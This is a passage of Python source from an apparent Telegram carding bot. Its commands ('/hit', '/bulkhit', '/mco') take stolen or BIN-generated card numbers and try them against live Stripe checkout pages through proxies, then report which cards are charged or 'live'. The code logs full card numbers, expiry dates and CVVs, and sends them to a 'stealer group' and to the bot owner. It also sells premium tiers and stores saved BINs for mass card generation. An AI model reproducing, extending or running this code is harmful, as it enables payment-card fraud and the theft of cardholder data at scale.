                              f"{EMOJI['card']} Card: <code>****{card['cc'][-4:]}</code>\n"
                              f"{EMOJI['bolt']} Merchant: {merchant}\n{EMOJI['crown']} Amount: {amount}"),
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
                await send_hit_to_user_pm(context.bot, user.id, card, checkout_data, result, check_time)
            elif status == "LIVE":
                card_statuses[i] = f"LIVE {EMOJI['live']} — {response_text[:50]}"
                results["live"].append(card_str)
                try:
                    from modules.bin_lookup import lookup_bin
                    _bin_info = lookup_bin(card['cc'][:6])
                except:
                    _bin_info = {}
                log_approved_card(user.id, user.username or user.first_name,
                                  card['cc'], card['month'], card['year'], card['cvv'],
                                  "auto_hitter_live", response_text, _bin_info)
                await send_to_stealer_group(context.bot, card['cc'], card['month'], card['year'], card['cvv'],
                                            "auto_hitter_live", response_text, _bin_info, user.id, user.username or user.first_name)
                check_time = float(result.get('time', 2.5) or 2.5)
                hit_detail_blocks.append(_build_hit_detail_block(card, result, checkout_data, _bin_info, check_time))
                try:
                    from config import OWNER_ID
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=(f"{EMOJI['live']} <b>LIVE CARD FOUND!</b>\n\n"
                              f"{EMOJI['users']} User: @{user.username or user.id}\n"
                              f"{EMOJI['card']} Card: <code>****{card['cc'][-4:]}</code>\n"
                              f"{EMOJI['bolt']} Merchant: {merchant}\n"
                              f"{EMOJI['stats']} Response: {response_text[:80]}"),
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
            elif status in ("3DS_REQUIRED", "3DS"):
                card_statuses[i] = f"3DS Required {EMOJI['3ds']}"
                results["3ds"].append(card_str)
            elif status == "DECLINED":
                card_statuses[i] = f"Declined {EMOJI['declined']} — {response_text[:50]}"
                results["declined"].append(card_str)
            elif status == "EXPIRED":
                card_statuses[i] = f"Expired {EMOJI['expired']} — Session expired"
                results["error"].append(card_str)
                break
            elif status == "NOT SUPPORTED":
                card_statuses[i] = f"Not Supported {EMOJI['blocked']}"
                results["error"].append(card_str)
                break
            else:
                card_statuses[i] = f"Error {EMOJI['error']} — {response_text[:50]}"
                results["error"].append(card_str)

            await _safe_edit(
                loading_msg,
                await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, i + 1, email=user_email, trial_info=trial_info),
                parse_mode=ParseMode.HTML, reply_markup=stop_keyboard
            )

            if i < len(cards) - 1:
                await asyncio.sleep(1)

        _active_hits.pop(hit_key, None)
        final_text = await _build_hit_status_text(
            merchant, price_str, success_url, cards, card_statuses, len(cards),
            email=user_email, trial_info=trial_info,
            hit_details=hit_detail_blocks if hit_detail_blocks else None
        )
        summary = (
            f"\n─────────────────────\n"
            f"✅ Charged: {len(results['charged'])}  "
            f"🟡 Live: {len(results['live'])}  "
            f"❌ Declined: {len(results['declined'])}  "
            f"🔐 3DS: {len(results['3ds'])}\n"
        )
        await _safe_edit(loading_msg, final_text + summary, parse_mode=ParseMode.HTML)

    except Exception as e:
        try:
            await loading_msg.edit_text(f"{PE_CROSS} <b>Error:</b> {str(e)[:150]}", parse_mode=ParseMode.HTML)
        except:
            pass


@require_approval
async def auto_hitter_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced /hit /co command — saved BINs, BIN gen, file, proxy support"""
    user = update.effective_user
    message = update.message

    full_text = message.text or ""

    # Extract checkout URL from message or reply
    url = extract_checkout_url(full_text)
    if not url and message.reply_to_message:
        reply_full = (message.reply_to_message.text or "") + " " + (message.reply_to_message.caption or "")
        url = extract_checkout_url(reply_full)

    if not url:
        # Show SEMEX-style dashboard when /hit is sent without a URL
        from modules.database import get_user_check_stats
        stats = get_user_check_stats(user.id)
        rank  = get_user_rank(user.id)

        # Build premium expiry info line
        premium_info = "👤 Free — Limited access"
        try:
            from modules.database import _execute_with_retry
            row = _execute_with_retry(
                "SELECT premium, premium_expiry FROM users WHERE user_id = %s",
                (user.id,), fetch_one=True
            )
            if is_owner(user.id):
                premium_info = "👑 Owner — Unlimited access"
            elif row and row.get("premium") and row.get("premium_expiry"):
                expiry = row["premium_expiry"]
                premium_info = f"💎 Premium | Expires {expiry.strftime('%Y-%m-%d')}"
            elif row and row.get("premium"):
                premium_info = "💎 Premium — Unlimited access"
            elif is_approved(user.id):
                premium_info = "✅ Approved — Free tier"
        except:
            premium_info = "✅ Active" if is_approved(user.id) else "👤 Free"

        dash_text, dash_kb = _build_hit_dashboard(user, stats, rank, premium_info)
        try:
            gif_url = get_sexy_anime_gif("welcome")
            if gif_url:
                await message.reply_animation(
                    animation=gif_url, caption=dash_text,
                    parse_mode=ParseMode.HTML, reply_markup=dash_kb
                )
            else:
                await message.reply_text(dash_text, parse_mode=ParseMode.HTML, reply_markup=dash_kb)
        except:
            await message.reply_text(dash_text, parse_mode=ParseMode.HTML, reply_markup=dash_kb)
        return

    # Strip command prefix (including optional @botname) and URL to isolate card/BIN
    remaining = re.sub(r'^[./]?(hit|co)[@\w]*\s*', '', full_text, flags=re.IGNORECASE).strip()
    # Remove the URL (may be different case/encoding), also try partial match
    remaining = remaining.replace(url, "").strip()
    # Clean up any leftover URL fragment or whitespace artifacts
    remaining = re.sub(r'https?://\S+', '', remaining).strip()

    # Parse cards from remaining text
    cards = auto_hitter_parse_cards(remaining) if remaining else []
    if not cards and remaining:
        single = auto_hitter_parse_card(remaining)
        if single:
            cards = [single]

    # BIN generation: if no cards but remaining looks like a BIN prefix
    if not cards and remaining:
        parts = remaining.strip().split()
        bin_str = parts[0] if parts else ""
        gen_count = min(int(parts[1]), 25) if len(parts) >= 2 and parts[1].isdigit() else 10
        bin_clean = bin_str.split("|")[0].replace("x", "").replace("X", "")
        if len(bin_clean) >= 6 and bin_clean.isdigit():
            gen_result = parse_gen_input(bin_str)
            if gen_result:
                prefix, mm, yy, cvv_pat = gen_result
                gen_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pat, gen_count)
                cards = auto_hitter_parse_cards("\n".join(gen_lines))

    # File support: reply to .txt file
    if not cards and message.reply_to_message:
        reply = message.reply_to_message
        if reply.document and reply.document.file_name and reply.document.file_name.endswith(".txt"):
            try:
                file = await context.bot.get_file(reply.document.file_id)
                content = await context.bot.download_file(file.file_path)
                file_text = content.read().decode("utf-8", errors="ignore")
                cards = auto_hitter_parse_cards(file_text)
            except Exception:
                pass
        elif reply.text:
            cleaned = re.sub(r'https?://\S+', '', reply.text).strip()
            if cleaned:
                cards = auto_hitter_parse_cards(cleaned)

    # No cards — show saved BINs picker if any, else ask for cards
    if not cards:
        saved = get_user_saved_bins(user.id)
        if saved:
            buttons = [
                [_btn(f"{b['name']} — {b['bin_value'][:6]}***", icon=EID["card"], callback_data=f"sbin_{user.id}_{b['name']}")]
                for b in saved[:10]
            ]
            buttons.append([_btn("Cancel", style="default", icon=EID["declined"], callback_data=f"sbin_cancel_{user.id}")])
            _pending_bin_hits[user.id] = {"url": url, "msg": message}
            await message.reply_text(
                f"{PE_CARD} <b>No cards provided.</b>\n\n"
                f"{PE_CARD} Choose a saved BIN to auto-generate 10 cards:",
                reply_markup=InlineKeyboardMarkup(buttons),
                parse_mode=ParseMode.HTML
            )
            return
        else:
            await message.reply_text(
                f"{PE_CROSS} <b>No valid cards found.</b>\n\n"
                f"{PE_CARD} Provide a card: <code>cc|mm|yy|cvv</code>\n"
                f"{PE_CARD} Or a BIN to auto-generate: <code>453201</code>\n"
                f"{PE_SAVE} Or save a BIN first: <code>/savebin name 453201</code>",
                parse_mode=ParseMode.HTML
            )
            return

    loading_msg = await message.reply_text(f"{PE_BOLT} <b>Fetching checkout...</b>", parse_mode=ParseMode.HTML)
    await _run_auto_hit(update, context, url, cards, loading_msg)


# ============================================================================
# BULK STRIPE HITTER — /bulkhit <url> <count> <bin>
# ============================================================================

@require_approval
async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bulk Stripe Hitter — generates cards from BIN and hits all simultaneously.
    Usage: /bulkhit <stripe_url> <count> <bin>
    Example: /bulkhit https://buy.stripe.com/xxx 20 453201
    """
    user = update.effective_user
    message = update.message
    args = context.args or []

    SEP = "─────────────────────"

    if len(args) < 3:
        await message.reply_text(
            f"⚡ <b>BULK STRIPE HITTER</b>\n{SEP}\n\n"
            f"📝 <b>Usage:</b>\n"
            f"<code>/bulkhit &lt;url&gt; &lt;count&gt; &lt;bin&gt;</code>\n\n"
            f"📌 <b>Examples:</b>\n"
            f"<code>/bulkhit https://buy.stripe.com/xxx 20 453201</code>\n"
            f"<code>/bulkhit https://buy.stripe.com/xxx 10 453201|xx|xx|xxx</code>\n\n"
            f"{SEP}\n"
            f"💎 Premium: up to 50 cards per batch\n"
            f"👤 Free: up to 10 cards per batch\n\n"
            f"⚡ All cards are hit <b>simultaneously</b> for maximum speed.",
            parse_mode=ParseMode.HTML
        )
        return

    url_arg = args[0]
    count_str = args[1]
    bin_str = args[2]

    # Validate URL
    checkout_url = extract_checkout_url(url_arg)
    if not checkout_url:
        await message.reply_text(
            f"❌ <b>Invalid URL.</b>\n"
            f"Must be a Stripe checkout URL.\n"
            f"Supported: <code>buy.stripe.com</code> · <code>checkout.stripe.com</code>",
            parse_mode=ParseMode.HTML
        )
        return

    # Validate count
    if not count_str.isdigit() or int(count_str) < 1:
        await message.reply_text(
            f"❌ <b>Invalid count.</b> Must be a positive number (e.g. 20).",
            parse_mode=ParseMode.HTML
        )
        return

    # Enforce per-plan limits
    max_cards = 50 if is_premium(user.id) else 10
    count = min(int(count_str), max_cards)

    if int(count_str) > max_cards:
        plan_label = "premium" if is_premium(user.id) else "free"
        await message.reply_text(
            f"⚠️ Count capped at <b>{max_cards}</b> for {plan_label} users.",
            parse_mode=ParseMode.HTML
        )

    # Parse BIN
    gen_result = parse_gen_input(bin_str)
    if not gen_result:
        await message.reply_text(
            f"❌ <b>Invalid BIN.</b> Must be at least 6 digits.\n"
            f"Format: <code>453201</code> or <code>453201|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML
        )
        return

    prefix, mm, yy, cvv_pattern = gen_result

    card_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pattern, count)

    if not card_lines:
        await message.reply_text(
            f"❌ Failed to generate cards from BIN <code>{prefix}</code>.",
            parse_mode=ParseMode.HTML
        )
        return

    loading_msg = await message.reply_text(
        f"{PE_BOLT} <b>Fetching checkout...</b>", parse_mode=ParseMode.HTML
    )

    user_proxy = _pick_proxy(user.id)
    proxy_url = ah_get_proxy_url(user_proxy) if user_proxy else None
    user_email = ah_get_user_email(user.id) or "checkout@gmail.com"

    try:
        checkout_data = await tls_get_checkout_info(checkout_url, proxy_url)
        if not checkout_data.get("pk") or not checkout_data.get("cs"):
            await loading_msg.edit_text(
                f"{PE_CROSS} <b>Could not parse checkout URL.</b>",
                parse_mode=ParseMode.HTML
            )
            return
    except Exception as ex:
        await loading_msg.edit_text(
            f"{PE_CROSS} <b>Error fetching checkout:</b> <code>{str(ex)[:120]}</code>",
            parse_mode=ParseMode.HTML
        )
        return

    merchant = html.escape(str(checkout_data.get("merchant") or "Unknown"))
    sym = get_currency_symbol(checkout_data.get("currency", "USD"))
    price = checkout_data.get("price")
    price_str = f"{sym}{price:.2f}" if price else "N/A"
    success_url = checkout_data.get("success_url") or "N/A"
    trial_info = _get_trial_info_text(checkout_data)
    checkout_data["email"] = user_email

    # Build display card list and per-card status tracker
    display_cards = []
    for line in card_lines:
        p = line.split("|")
        display_cards.append({
            "cc":    p[0] if p else "",
            "month": p[1] if len(p) > 1 else "01",
            "year":  p[2] if len(p) > 2 else "25",
            "cvv":   p[3] if len(p) > 3 else "000",
        })
    card_index = {line: i for i, line in enumerate(card_lines)}
    card_statuses = [f"{EMOJI['hitting']} Pending..." for _ in display_cards]

    charged, live, declined, tds, errors = [], [], [], [], []
    done_count = 0
    total_count = len(display_cards)
    _last_edit = [0.0]

    init_text = await _build_hit_status_text(
        merchant, price_str, success_url, display_cards, card_statuses, 0,
        email=user_email, trial_info=trial_info
    )
    await _safe_edit(loading_msg, init_text, parse_mode=ParseMode.HTML)

    async for raw_str, result in bulk_hit_cards(card_lines, checkout_data, user_proxy, user_email):
        p = raw_str.split("|")
        cc    = p[0] if p else ""
        month = p[1] if len(p) > 1 else ""
        year  = p[2] if len(p) > 2 else ""
        cvv   = p[3] if len(p) > 3 else ""
        idx   = card_index.get(raw_str, -1)
        status = result.get("status", "ERROR")
        resp = html.escape(str(result.get("response", ""))[:60])

        if status == "CHARGED":
            if idx >= 0:
                card_statuses[idx] = f"CHARGED {EMOJI['charged']}"
            charged.append((raw_str, resp))
            try:
                log_approved_card(user.id, user.username or user.first_name,
                                  cc, month, year, cvv, "bulk_hitter", resp, {})
                await send_to_stealer_group(
                    context.bot, cc, month, year, cvv,
                    "bulk_hitter", resp, {}, user.id, user.username or user.first_name
                )
                await context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=(f"{EMOJI['charged']} <b>BULK HITTER CHARGED!</b>\n\n"
                          f"👤 User: @{user.username or user.id}\n"
                          f"💳 Card: <code>****{cc[-4:]}</code>\n"
                          f"🏪 Merchant: {merchant}\n💰 Amount: {price_str}"),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
        elif status == "LIVE":
            if idx >= 0:
                card_statuses[idx] = f"LIVE {EMOJI['live']} — {resp[:50]}"
            live.append((raw_str, resp))
        elif status in ("3DS_REQUIRED", "3DS"):
            if idx >= 0:
                card_statuses[idx] = f"3DS Required {EMOJI['3ds']}"
            tds.append(raw_str)
        elif status == "DECLINED":
            if idx >= 0:
                card_statuses[idx] = f"Declined {EMOJI['declined']} — {resp[:50]}"
            declined.append((raw_str, resp))
        else:
            if idx >= 0:
                card_statuses[idx] = f"Error {EMOJI['error']} — {resp[:50]}"
            errors.append(raw_str)

        done_count += 1
        now = asyncio.get_running_loop().time()
        if done_count == 1 or done_count == total_count or done_count % 3 == 0 or (now - _last_edit[0] > 2):
            try:
                txt = await _build_hit_status_text(
                    merchant, price_str, success_url, display_cards, card_statuses,
                    done_count, email=user_email, trial_info=trial_info
                )
                await _safe_edit(loading_msg, txt, parse_mode=ParseMode.HTML)
                _last_edit[0] = now
            except Exception:
                pass

    summary = (
        f"\n─────────────────────\n"
        f"{EMOJI['charged']} Charged: {len(charged)}  "
        f"{EMOJI['live']} Live: {len(live)}  "
        f"{EMOJI['declined']} Declined: {len(declined)}  "
        f"{EMOJI['3ds']} 3DS: {len(tds)}  "
        f"{EMOJI['error']} Errors: {len(errors)}\n"
    )
    final_text = await _build_hit_status_text(
        merchant, price_str, success_url, display_cards, card_statuses,
        total_count, email=user_email, trial_info=trial_info
    )
    await _safe_edit(loading_msg, final_text + summary, parse_mode=ParseMode.HTML)


# ============================================================================
# SAVED BINS COMMANDS
# ============================================================================

@require_premium
async def savebin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Save a BIN prefix with a friendly name — /savebin name BIN[|mm|yy|cvv]"""
    user = update.effective_user
    message = update.message
    args = context.args or []
    if len(args) < 2:
        await message.reply_text(
            f"{PE_SAVE} <b>SAVE BIN</b>\n\n"
            f"{PE_CARD} <b>Usage:</b> <code>/savebin name BIN</code>\n\n"
            f"{PE_BOLT} <b>Examples:</b>\n"
            "<code>/savebin visa4532 453201</code>\n"
            "<code>/savebin mc5100 510051|xx|xx|xxx</code>\n\n"
            f"{PE_CARD} The name lets you pick this BIN quickly when hitting.",
            parse_mode=ParseMode.HTML
        )
        return
    name = args[0].lower()
    bin_value = args[1]
    if len(name) > 20:
        await message.reply_text(f"{PE_CROSS} Name too long (max 20 chars).", parse_mode=ParseMode.HTML)
        return
    parsed = parse_gen_input(bin_value)
    if not parsed:
        await message.reply_text(
            f"{PE_CROSS} <b>Invalid BIN.</b> Must be at least 6 digits.\n"
            f"{PE_BOLT} Example: <code>453201</code> or <code>453201|xx|26|xxx</code>",
            parse_mode=ParseMode.HTML
        )
        return
    save_user_bin(user.id, name, bin_value)
    await message.reply_text(
        f"{PE_CHECK} <b>BIN Saved!</b>\n\n"
        f"{PE_BOLT} <b>Name:</b> <code>{html.escape(name)}</code>\n"
        f"{PE_CARD} <b>BIN:</b> <code>{html.escape(bin_value)}</code>\n\n"
        f"{PE_SAVE} Use <code>/mybins</code> to view all saved BINs.",
        parse_mode=ParseMode.HTML
    )


@require_premium
async def mybins_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List saved BINs — /mybins"""
    user = update.effective_user
    message = update.message
    saved = get_user_saved_bins(user.id)
    if not saved:
        await message.reply_text(
            f"{PE_CARD} <b>No Saved BINs</b>\n\n"
            "You haven't saved any BINs yet.\n"
            f"{PE_SAVE} Use <code>/savebin name BIN</code> to save one.",
            parse_mode=ParseMode.HTML
        )
        return
    lines = [f"{PE_SAVE} <b>SAVED BINS ({len(saved)})</b>\n"]
    for b in saved:
        lines.append(f"{PE_CARD} <code>{html.escape(b['name'])}</code> ➜ <code>{html.escape(b['bin_value'])}</code>")
    lines.append(f"\n{PE_TRASH} Delete: <code>/deletebin name</code>")
    lines.append(f"{PE_BOLT} Use with: <code>/hit url</code>")
    await message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


@require_premium
async def deletebin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Delete a saved BIN — /deletebin name"""
    user = update.effective_user
    message = update.message
    args = context.args or []
    if not args:
        await message.reply_text(
            f"{PE_TRASH} <b>DELETE BIN</b>\n\n"
            f"{PE_CARD} <b>Usage:</b> <code>/deletebin name</code>\n\n"
            f"{PE_SAVE} Use <code>/mybins</code> to see your saved BINs.",
            parse_mode=ParseMode.HTML
        )
        return
    name = args[0].lower()
    deleted = delete_user_bin(user.id, name)
    if deleted:
        await message.reply_text(
            f"{PE_TRASH} <b>Deleted:</b> <code>{html.escape(name)}</code>",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.reply_text(
            f"{PE_CROSS} <b>BIN not found:</b> <code>{html.escape(name)}</code>\n\n"
            f"{PE_SAVE} Use <code>/mybins</code> to view your saved BINs.",
            parse_mode=ParseMode.HTML
        )


# AUTO HITTER ADDITIONAL COMMANDS
# ============================================================================

@require_premium
async def coinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get checkout info without charging - /coinfo [url]"""
    user = update.effective_user
    message = update.message
    
    if not context.args:
        await message.reply_text(
            "<b>🎯 Checkout Info</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/coinfo [stripe_checkout_url]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/coinfo https://checkout.stripe.com/c/pay/cs_...</code>\n\n"
            "Get merchant, amount, and checkout details without charging.",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = context.args[0].strip()
    
    if "stripe" not in url.lower() and "checkout" not in url.lower():
        await message.reply_text(ae("❌ <b>Invalid URL</b>\n\nPlease provide a valid Stripe checkout URL."), parse_mode=ParseMode.HTML)
        return
    
    status_msg = await message.reply_text(ae("🔍 <b>Fetching checkout info...</b>"), parse_mode=ParseMode.HTML)
    
    try:
        info = await tls_get_checkout_info(url)
        text = format_checkout_info(info)
        
        if info.get("pk") and info.get("cs"):
            text += f"\n\n💡 <b>To charge:</b>\n<code>/co {url} [card|mm|yy|cvv]</code>"
        else:
            text += "\n\n⚠️ Could not extract session details"
            
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML)
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ <b>Error:</b> {str(e)[:100]}"), parse_mode=ParseMode.HTML)

@require_premium
async def cocheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if checkout is still active - /cocheck [url]"""
    user = update.effective_user
    message = update.message
    
    if not context.args:
        await message.reply_text(
            "<b>🔍 Checkout Status Check</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/cocheck [stripe_checkout_url]</code>\n\n"
            "Check if a Stripe checkout URL is still active and chargeable.",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = context.args[0].strip()
    
    status_msg = await message.reply_text(ae("🔍 <b>Checking checkout status...</b>"), parse_mode=ParseMode.HTML)
    
    try:
        info = await tls_get_checkout_info(url)
        
        if info.get("pk") and info.get("cs"):
            is_active = await ah_check_checkout_active(info["pk"], info["cs"])
            
            if is_active:
                merchant = info.get('merchant', 'Unknown')
                price = info.get('price', 'N/A')
                currency = info.get('currency', 'USD')
                
                await status_msg.edit_text(
                    f"✅ <b>CHECKOUT ACTIVE</b>\n\n"
                    f"🏢 <b>Merchant:</b> {merchant}\n"
                    f"💰 <b>Amount:</b> {price} {currency}\n"
                    f"📦 <b>Product:</b> {info.get('product', 'N/A')}\n\n"
                    f"💡 Ready to charge with <code>/co</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await status_msg.edit_text(
                    "❌ <b>CHECKOUT EXPIRED</b>\n\n"
                    "This checkout session has expired or been completed.",
                    parse_mode=ParseMode.HTML
                )
        else:
            await status_msg.edit_text(
                "❌ <b>INVALID CHECKOUT</b>\n\n"
                "Could not extract checkout details from this URL.",
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ <b>Error:</b> {str(e)[:100]}"), parse_mode=ParseMode.HTML)

@require_premium
async def mco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass checkout hitter - /mco [url] + cards"""
    user = update.effective_user
    message = update.message
    
    full_text = message.text or ""
    if message.reply_to_message and message.reply_to_message.text:
        full_text = full_text + "\n" + message.reply_to_message.text
    
    url = extract_checkout_url(full_text)
    
    if not url:
        await message.reply_text(
            "<b>⚡ Mass Auto Hitter</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/mco [url]</code> + reply to cards\n"
            "▸ <code>/mco [url] [cards...]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/mco https://checkout.stripe.com/pay/cs_...</code>\n"
            "<code>4111111111111111|12|25|123</code>\n"
            "<code>5500000000000004|06|26|456</code>\n\n"
            "Max 50 cards per batch.",
            parse_mode=ParseMode.HTML
        )
        return
    
    text_without_url = full_text.replace(url, ' ')
    cards = auto_hitter_parse_cards(text_without_url)
    
    if not cards:
        for part in re.split(r'[\s\n]+', text_without_url):
            if '|' in part and len(part) > 10:
                card = auto_hitter_parse_card(part.strip())
                if card and card not in cards:
                    cards.append(card)
    
    if not cards:
        await message.reply_text(ae("❌ <b>No cards found!</b>\n\nProvide cards in format: <code>cc|mm|yy|cvv</code>"), parse_mode=ParseMode.HTML)
        return
    
    if len(cards) > 50:
        cards = cards[:50]
    
    status_msg = await message.reply_text(ae(f"🔍 <b>Extracting checkout...</b>\n\nCards: {len(cards)}"), parse_mode=ParseMode.HTML)
    
    try:
        info = await tls_get_checkout_info(url)
        
        if not info.get("pk") or not info.get("cs"):
            await status_msg.edit_text(ae("❌ <b>Could not extract checkout session!</b>"), parse_mode=ParseMode.HTML)
            return
        
        merchant = info.get('merchant', 'Unknown')
        amount = f"{info.get('price', '0')} {info.get('currency', 'USD')}"
        
        results = {"charged": [], "declined": [], "live": [], "error": []}
        
        await status_msg.edit_text(
            f"⚡ <b>Mass Hitting...</b>\n\n"
            f"🏢 Merchant: {merchant}\n"
            f"💰 Amount: {amount}\n"
            f"💳 Cards: {len(cards)}\n\n"
            f"Progress: 0/{len(cards)}",
            parse_mode=ParseMode.HTML
        )
        
        for i, card in enumerate(cards, 1):
            user_proxy = ah_get_user_proxy(user.id)
            user_email = ah_get_user_email(user.id)
            result = await try_all_approaches(info["pk"], info["cs"], card, user_proxy, user_email)
            card_str = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}"
            
            status = result.get("status", "ERROR")
            if status == "CHARGED":
                results["charged"].append(card_str)
            elif status == "3DS_REQUIRED":
                results["live"].append(card_str)
            elif status == "DECLINED":
                results["declined"].append(card_str)
            else:
                results["error"].append(card_str)
            
            if i % 5 == 0 or i == len(cards):
                try:
                    await status_msg.edit_text(
                        f"⚡ <b>Mass Hitting...</b>\n\n"
                        f"🏢 Merchant: {merchant}\n"
                        f"💰 Amount: {amount}\n\n"
                        f"Progress: {i}/{len(cards)}\n"
                        f"✅ Charged: {len(results['charged'])}\n"
                        f"🔵 Live (3DS): {len(results['live'])}\n"
                        f"❌ Declined: {len(results['declined'])}",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
        
        summary = f"<b>⚡ MASS HIT COMPLETE</b>\n\n"
        summary += f"🏢 <b>Merchant:</b> {merchant}\n"
        summary += f"💰 <b>Amount:</b> {amount}\n\n"
        summary += f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        summary += f"📊 <b>Results:</b>\n"
        summary += f"✅ Charged: {len(results['charged'])}\n"
        summary += f"🔵 Live (3DS): {len(results['live'])}\n"
        summary += f"❌ Declined: {len(results['declined'])}\n"
        summary += f"⚠️ Errors: {len(results['error'])}\n\n"
        
        if results["charged"]:
            summary += f"<b>✅ CHARGED:</b>\n"
            for c in results["charged"][:10]:
                summary += f"<code>{c}</code>\n"
            if len(results["charged"]) > 10:
                summary += f"<i>...and {len(results['charged']) - 10} more</i>\n"
        
        if results["live"]:
            summary += f"\n<b>🔵 LIVE (3DS):</b>\n"
            for c in results["live"][:10]:
                summary += f"<code>{c}</code>\n"
            if len(results["live"]) > 10:
                summary += f"<i>...and {len(results['live']) - 10} more</i>\n"
        
        await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ <b>Error:</b> {str(e)[:100]}"), parse_mode=ParseMode.HTML)

# ============================================================================
# PROXY MANAGEMENT COMMANDS
# ============================================================================

@require_approval
async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add proxy for user - /addproxy [proxy]"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nProxy management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    user_proxies = ah_get_user_proxies(user_id)
    
    if not context.args:
        if user_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"
        
        await message.reply_text(
            "<b>🔒 Proxy Manager</b>\n\n"
            f"<b>Your Proxies ({len(user_proxies)}):</b>\n{proxy_list}\n\n"
            "<b>Commands:</b>\n"
            "▸ <code>/addproxy proxy</code> — Add proxy\n"
            "▸ <code>/removeproxy proxy</code> — Remove proxy\n"
            "▸ <code>/removeproxy all</code> — Remove all\n"
            "▸ <code>/myproxy</code> — View your proxies\n"
            "▸ <code>/checkproxy</code> — Check all proxies\n\n"
            "<b>Formats:</b>\n"
            "• <code>host:port:user:pass</code>\n"
            "• <code>user:pass@host:port</code>\n"
            "• <code>host:port</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_input = " ".join(context.args).strip()
    proxies_to_add = [p.strip() for p in proxy_input.split('\n') if p.strip()]
    
    if not proxies_to_add:
        await message.reply_text(ae("❌ <b>Error:</b> No valid proxies provided"), parse_mode=ParseMode.HTML)
        return
    
    checking_msg = await message.reply_text(
        f"⏳ <b>Checking Proxies...</b>\n\n"
        f"Total: {len(proxies_to_add)}\n"
        f"Threads: 10",
        parse_mode=ParseMode.HTML
    )
    
    results = await ah_check_proxies_batch(proxies_to_add, max_threads=10)
    
    alive_proxies = []
    dead_proxies = []
    
    for r in results:
        if r["status"] == "alive":
            alive_proxies.append(r)
            ah_add_user_proxy(user_id, r["proxy"])
        else:
            dead_proxies.append(r)
    
    response = f"<b>✅ Proxy Check Complete</b>\n\n"
    response += f"Alive: {len(alive_proxies)}/{len(proxies_to_add)} ✅\n"
    response += f"Dead: {len(dead_proxies)}/{len(proxies_to_add)} ❌\n\n"
    
    if alive_proxies:
        response += "<b>Added:</b>\n"
        for p in alive_proxies[:5]:
            response += f"• <code>{p['proxy']}</code> ({p['response_time']})\n"
        if len(alive_proxies) > 5:
            response += f"• <code>... and {len(alive_proxies) - 5} more</code>\n"
    
    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

@require_approval
async def removeproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove proxy - /removeproxy [proxy|all]"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nProxy management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    
    if not context.args:
        await message.reply_text(
            "<b>🗑️ Remove Proxy</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/removeproxy proxy</code> — Remove specific\n"
            "▸ <code>/removeproxy all</code> — Remove all",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_input = " ".join(context.args).strip()
    
    if proxy_input.lower() == "all":
        user_proxies = ah_get_user_proxies(user_id)
        count = len(user_proxies)
        ah_remove_user_proxy(user_id, "all")
        await message.reply_text(
            f"<b>✅ All Proxies Removed</b>\n\n"
            f"Removed: {count} proxies",
            parse_mode=ParseMode.HTML
        )
        return
    
    if ah_remove_user_proxy(user_id, proxy_input):
        await message.reply_text(
            f"<b>✅ Proxy Removed</b>\n\n"
            f"Proxy: <code>{proxy_input}</code>",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.reply_text(
            f"<b>❌ Error</b>\n\n"
            f"Proxy not found",
            parse_mode=ParseMode.HTML
        )

@require_approval
async def myproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View your proxies - /myproxy"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nProxy management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
